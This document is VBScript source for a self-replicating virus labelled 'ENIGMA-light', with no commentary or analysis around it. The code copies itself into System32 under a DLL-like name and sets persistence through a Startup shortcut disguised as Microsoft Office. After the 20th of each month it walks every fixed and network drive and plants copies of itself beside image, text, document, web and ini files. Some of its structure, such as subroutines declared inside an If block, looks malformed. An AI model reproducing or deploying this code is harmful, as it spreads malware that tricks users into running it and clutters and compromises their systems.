'Virus "ENIGMA-light"
'Made in Russia

On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
Set s = CreateObject("Wscript.Shell")
File.Copy ("C:\WINDOWS\System32\RunDLL.dll.vbe")
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, StartupPath
StartupPath = WSHShell.SpecialFolders("Startup")
Set MyShortcut = WSHShell.CreateShortcut(StartupPath & _
 "\Microsoft Office.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("C:\WINDOWS\System32\RunDLL.dll.vbe")
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Common Files\Microsoft Shared\Office10\MSOICONS.exe")
MyShortcut.Save
if day(now)>20 then
haha()
Sub haha()
On Error Resume Next
Dim d, dc, s, fso, haha
Set fso = CreateObject("Scripting.FileSystemObject")
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
hihi (d.Path & "\")
End If
Next
haha = s
End sub
Sub hehe(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, s, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If  (ext = "jpg") or (ext = "txt") or (ext = "bmp") or (ext = "doc") or (ext = "htm") or (ext = "html") or (ext = "ini") Then
Set f = fso.getfile(wscript.scriptfullname)
f.Copy (f1.Path & ".vbe")

End If
Next
End Sub
Sub hihi(folderspec)
On Error Resume Next
Dim f, f1, sf, fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
hehe (f1.Path)
hihi (f1.Path)
Next
End Sub
end if
 
